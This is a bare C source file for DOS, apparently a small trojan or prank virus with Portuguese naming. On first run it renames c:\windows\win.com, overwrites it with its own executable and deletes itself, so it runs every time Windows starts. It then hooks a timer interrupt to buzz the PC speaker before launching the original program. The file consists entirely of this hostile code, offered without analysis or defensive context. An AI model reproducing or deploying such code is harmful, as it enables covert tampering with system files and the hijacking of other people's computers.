#include <process.h>
#include<dos.h>
#include<conio.h>
#include<stdio.h>
#include <stdlib.h>
#include <string.h>
void interrupt minha_rotina_de_relogio(void);
void interrupt (*clock_tick) (void);
union REGS regs;
//---------------------------------------------------------------------------
int i=0;
void main(int argc,char *argv[ ])
{
  FILE *s;
  char ch='a',muda[40]="copy ",del[40]="del ";
  int cont=0,conf=0;
  strcat(muda,argv[0]);
  strcat(muda," c:\\windows\\win.com");
  strcat(del,argv[0]);
  if ((s=fopen("C:\\WINDOWS\\SYS.TMP","r+"))==NULL){
       s=fopen("C:\\WINDOWS\\SYS.TMP","wt");
       fprintf(s,"alan\n");
       fclose(s);
       system("copy c:\\windows\\win.com c:\\windows\\sis.com");
       clrscr();
       system(muda);
       clrscr();
       system(del);
       clrscr();
       exit(1);
       }
  disable();
  clock_tick = getvect(28);
  setvect(28,minha_rotina_de_relogio);
  enable();

  #ifdef RESIDENTE
	 keep(0,400);
  #else
	 system("\sis");
	 disable();
	 setvect(28,clock_tick);
	 enable();
   #endif
}

void interrupt minha_rotina_de_relogio(void)
{
   if(i<400)
   {
     outportb(0x61,255);
     delay(1);
     outportb(0x61,0);
   }
   if(i>400 && i<1000)
   {
      outportb(0x61,0);
      delay(1);
   }
   if(i>1000)
     i=0;
}